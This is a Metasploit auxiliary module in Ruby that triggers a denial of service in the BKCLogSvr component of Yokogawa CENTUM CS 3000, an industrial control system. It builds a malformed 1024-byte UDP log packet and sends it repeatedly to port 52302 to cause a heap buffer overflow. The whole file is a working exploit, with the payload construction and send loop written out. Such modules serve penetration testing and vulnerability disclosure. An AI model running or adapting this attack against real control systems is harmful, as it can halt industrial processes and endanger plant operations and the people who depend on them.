##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Yokogawa CENTUM CS 3000 BKCLogSvr.exe Heap Buffer Overflow',
      'Description'    => %q{
        This module abuses a buffer overflow vulnerability to trigger a Denial of Service
        of the BKCLogSvr component in the Yokogaca CENTUM CS 3000 product. The vulnerability
        exists in the handling of malformed log packets, with an unexpected long level field.
        The root cause of the vulnerability is a combination of usage of uninitialized memory
        from the stack and a dangerous string copy. This module has been tested successfully
        on Yokogawa CENTUM CS 3000 R3.08.50.
      },
      'Author'         =>
        [
          'juan vazquez',
          'Redsadic <julian.vilas[at]gmail.com>'
        ],
      'References'     =>
        [
          [ 'URL', 'http://www.yokogawa.com/dcs/security/ysar/YSAR-14-0001E.pdf' ],
          [ 'URL', 'https://community.rapid7.com/community/metasploit/blog/2014/03/10/yokogawa-centum-cs3000-vulnerabilities' ]
        ],
      'DisclosureDate' => 'Mar 10 2014',
    ))

    register_options(
      [
        Opt::RPORT(52302),
        OptInt.new('RLIMIT', [true,  "Number of packets to send", 10])
      ], self.class)
  end

  def run
    if datastore['RLIMIT'] < 2
      print_error("Two consecutive packets are needed to trigger the DoS condition. Please increment RLIMIT.")
      return
    end

    # Crash due to read bad memory
    test = [1024].pack("V")             # packet length
    test << "AAAA"                      # Unknown
    test << "SOURCE\x00\x00"            # Source
    test << "\x00" * 8                  # Padding
    test << "B" * (1024 - test.length)  # Level & Message coalesced

    connect_udp

    # Sending two consecutives packages is enough to
    # trigger the overflow and cause the DoS. But if
    # legit packets are processed by the server, between
    # the two malformed packages, overflow won't happen.
    # Unfortunately because of the usage of UDP and the
    # absence of answer, there isn't a reliable way to
    # check if the DoS condition has been triggered.
    print_status("Sending #{datastore['RLIMIT']} packets...")
    (1..datastore['RLIMIT']).each do |i|
      vprint_status("Sending #{i}/#{datastore['RLIMIT']}...")
      udp_sock.put(test)
    end

    disconnect_udp
  end

end
